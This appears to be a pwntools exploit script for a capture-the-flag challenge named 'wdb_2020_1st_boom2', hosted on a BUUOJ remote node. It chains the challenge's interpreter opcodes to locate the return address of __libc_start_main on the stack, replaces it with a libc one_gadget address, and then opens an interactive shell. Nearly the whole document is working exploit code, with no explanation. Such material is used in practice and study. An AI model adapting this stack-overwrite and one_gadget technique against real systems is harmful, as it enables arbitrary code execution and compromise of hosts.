from pwn import *
from sys import argv

context(arch='amd64',log_level='debug')
binary = './wdb_2020_1st_boom2'
p = remote('node4.buuoj.cn',26027) if argv[1] == 'r' else process(binary)
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')

offset = 0x00007fffffffdde0 - 0x7fffffffdcf8#0xe8
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = one_gadgets[0]

or_temp_pop = p64(14)
add_tmp = p64(25)
sub_tmp = p64(26)
set_stack = p64(13)
set_derefed_stack = p64(11)
set_value_as_addr = p64(9)

def set_tmp(val):
    return p64(1) + p64(val)

payload = or_temp_pop
payload += set_tmp(0xe8) + sub_tmp + set_stack
payload += set_value_as_addr+ set_stack
payload += set_tmp(one_gadget - (231 + libc.symbols["__libc_start_main"])) + add_tmp
payload += set_derefed_stack
p.send(payload) #步骤7

p.interactive()